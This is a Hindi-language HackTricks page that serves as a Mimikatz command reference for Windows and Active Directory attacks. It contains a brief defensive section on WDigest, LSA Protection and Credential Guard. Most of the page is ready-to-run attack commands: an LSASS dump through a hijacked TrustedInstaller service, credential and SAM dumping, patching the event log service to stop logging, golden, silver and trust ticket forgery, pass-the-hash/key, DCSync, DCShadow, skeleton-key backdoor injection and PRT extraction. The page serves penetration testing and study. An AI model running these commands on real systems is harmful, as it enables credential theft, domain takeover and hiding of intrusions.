# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**यह पेज [adsecurity.org](https://adsecurity.org/?page_id=1821) के एक पेज पर आधारित है**। अधिक जानकारी के लिए मूल पेज देखें!<sup>[[3]](#references)</sup>

## LM और Clear-Text in memory

Windows 8.1 और Windows Server 2012 R2 से, credential theft से सुरक्षा के लिए महत्वपूर्ण उपाय लागू किए गए हैं:

- **LM hashes और plain-text passwords** को security बढ़ाने के लिए अब memory में store नहीं किया जाता। एक specific registry setting, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ को `0` के DWORD value के साथ configure किया जाना चाहिए ताकि Digest Authentication disable हो और यह सुनिश्चित हो कि "clear-text" passwords LSASS में cached न हों।

- **LSA Protection** को Local Security Authority (LSA) process को unauthorized memory reading और code injection से सुरक्षित रखने के लिए introduce किया गया है। यह LSASS को protected process के रूप में mark करके किया जाता है। LSA Protection को activate करने के लिए:
1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ में registry को modify करके `RunAsPPL` को `dword:00000001` पर set करें।
2. एक Group Policy Object (GPO) लागू करें जो managed devices पर इस registry change को enforce करे।

इन protections के बावजूद, Mimikatz जैसे tools specific drivers का उपयोग करके LSA Protection को bypass कर सकते हैं, हालांकि ऐसी activities event logs में record होने की संभावना रहती है।

Modern workstations पर यह और भी महत्वपूर्ण है क्योंकि **Credential Guard कई Windows 11 22H2+ और Windows Server 2025 domain-joined, non-DC systems पर default रूप से enabled होता है**, जबकि **LSASS-as-PPL fresh Windows 11 22H2+ installs पर default रूप से enabled होता है**। व्यवहार में, इसका अर्थ है कि `sekurlsa::logonpasswords` से अक्सर पुराने tradecraft की अपेक्षा कम material मिलता है और operators तेजी से **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)**, या **CloudAP/PRT-oriented modules** का उपयोग करते हैं। Protection side के लिए [Windows credentials protections](credentials-protections.md) देखें।

### SeDebugPrivilege Removal का Counteracting

Administrators के पास सामान्यतः SeDebugPrivilege होता है, जो उन्हें programs को debug करने में सक्षम बनाता है। Unauthorized memory dumps को रोकने के लिए इस privilege को restrict किया जा सकता है; attackers credentials को memory से extract करने के लिए अक्सर इस technique का उपयोग करते हैं। हालांकि, यह privilege remove किए जाने के बाद भी TrustedInstaller account customized service configuration का उपयोग करके memory dumps perform कर सकता है:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
यह `lsass.exe` memory को एक file में dump करने की अनुमति देता है, जिसका credentials extract करने के लिए किसी अन्य system पर analysis किया जा सकता है:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Mimikatz में Event log tampering में दो मुख्य actions शामिल हैं: event logs को clear करना और नई events की logging रोकने के लिए Event service को patch करना। इन actions को करने के commands नीचे दिए गए हैं:

#### Clearing Event Logs

- **Command**: इस action का उद्देश्य event logs को delete करना है, जिससे malicious activities को track करना कठिन हो जाता है।
- Mimikatz अपने standard documentation में सीधे command line के माध्यम से event logs clear करने के लिए कोई direct command प्रदान नहीं करता। हालांकि, event log manipulation में आमतौर पर Mimikatz के बाहर system tools या scripts का उपयोग करके specific logs clear किए जाते हैं (जैसे PowerShell या Windows Event Viewer का उपयोग करके)।

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- यह experimental command Event Logging Service के behavior को modify करने के लिए बनाई गई है, जिससे वह effectively नई events record करने से रुक जाती है।
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` command यह सुनिश्चित करती है कि Mimikatz को system services modify करने के लिए आवश्यक privileges प्राप्त हों।
- इसके बाद `event::drop` command Event Logging service को patch करती है।

### Kerberos Ticket Attacks

नीचे दिए गए commands को quick syntax reminders के रूप में उपयोग करें। [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), और [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) के dedicated pages में up-to-date AES/PAC/opsec nuances शामिल हैं।

### Golden Ticket Creation

Golden Ticket domain-wide access impersonation की अनुमति देता है। मुख्य command और parameters:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Domain name।
- `/sid`: Domain का Security Identifier (SID)।
- `/user`: Impersonate किए जाने वाले username।
- `/krbtgt`: Domain के KDC service account का NTLM hash।
- `/ptt`: Ticket को सीधे memory में inject करता है।
- `/ticket`: Ticket को बाद में उपयोग के लिए save करता है।

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets specific services तक access प्रदान करते हैं। मुख्य command और parameters:

- Command: Golden Ticket के समान, लेकिन specific services को target करता है।
- Parameters:
- `/service`: Target की जाने वाली service (जैसे, cifs, http)।
- अन्य parameters Golden Ticket के समान।

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Creation

Trust Tickets का उपयोग trust relationships का लाभ उठाकर domains के बीच resources access करने के लिए किया जाता है। मुख्य command और parameters:

- Command: Golden Ticket के समान, लेकिन trust relationships के लिए।
- Parameters:
- `/target`: Target domain का FQDN।
- `/rc4`: Trust account का NTLM hash।

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### अतिरिक्त Kerberos Commands

- **Tickets की Listing**:

- Command: `kerberos::list`
- वर्तमान user session के लिए सभी Kerberos tickets की सूची दिखाता है।

- **Pass the Cache**:

- Command: `kerberos::ptc`
- cache files से Kerberos tickets inject करता है।
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Command: `kerberos::ptt`
- किसी अन्य session में Kerberos ticket का उपयोग करने की अनुमति देता है।
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Tickets को Purge करना**:
- Command: `kerberos::purge`
- session से सभी Kerberos tickets को clear करता है।
- ticket manipulation commands का उपयोग करने से पहले conflicts से बचने के लिए उपयोगी।

### Over-Pass-the-Hash / Pass-the-Key

यदि `RC4` disabled या unreliable है, तो Mimikatz केवल NT hash का उपयोग करने के बजाय **AES128/AES256 Kerberos keys** को current logon session में patch कर सकता है। आधुनिक domains के लिए, `sekurlsa::pth` को केवल NTLM-only मानने की तुलना में यह आमतौर पर बेहतर विकल्प है।<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` नया console शुरू करने के बजाय current process का पुनः उपयोग करता है, जो तब उपयोगी होता है जब आप उसी context में तुरंत `lsadump::dcsync` जैसी चीजें चलाना चाहते हैं।

### Active Directory Tampering

- **DCShadow**: AD object manipulation के लिए किसी machine को अस्थायी रूप से DC की तरह कार्य करने दें। [DCShadow](../active-directory-methodology/dcshadow.md) देखें।

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: password data का अनुरोध करने के लिए DC का अनुकरण करें। [DCSync](../active-directory-methodology/dcsync.md) देखें।
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: LSA से credentials निकालें।

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: computer account के password data का उपयोग करके DC का impersonate करें।

- _Original context में NetSync के लिए कोई specific command उपलब्ध नहीं है।_

- **LSADUMP::SAM**: local SAM database तक access प्राप्त करें।

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: registry में stored secrets को decrypt करें।

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: किसी user के लिए नया NTLM hash set करें।

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: trust authentication information प्राप्त करें।
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

**Entra ID** या **hybrid-joined** hosts पर, `sekurlsa::cloudap` LSASS से cached **Primary Refresh Token (PRT)** material expose कर सकता है। यदि संबंधित Proof-of-Possession key software-protected है, तो `dpapi::cloudapkd` subsequent **Pass-the-PRT** workflows के लिए आवश्यक clear/derived key material derive कर सकता है।<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
जब key TPM-backed होती है, तब यह काफी कठिन हो जाता है, लेकिन hybrid endpoints पर इसकी जांच करना उपयोगी है, क्योंकि cached CloudAP data classic `wdigest` output से अधिक उपयोगी हो सकता है।<sup>[[2]](#references)</sup> Cloud-side abuse chain के लिए, [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) देखें।

### विविध

- **MISC::Skeleton**: DC पर LSASS में backdoor inject करें।
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: backup rights प्राप्त करें।

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: debug privileges प्राप्त करें।
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: logged-on users के credentials दिखाएं।

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: memory से Kerberos tickets extract करें।
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid और Token Manipulation

- **SID::add/modify**: SID और SIDHistory बदलें।

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _original context में modify के लिए कोई specific command नहीं है।_

- **TOKEN::Elevate**: tokens का impersonation करें।
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: multiple RDP sessions की अनुमति दें।

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP sessions की सूची बनाएं।
- _original context में TS::Sessions के लिए कोई specific command नहीं दिया गया है।_

### Vault

- Windows Vault से passwords extract करें।
- `mimikatz "vault::cred /patch" exit`


## References

- [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz command reference](https://adsecurity.org/?page_id=1821)

{{#include ../../banners/hacktricks-training.md}}
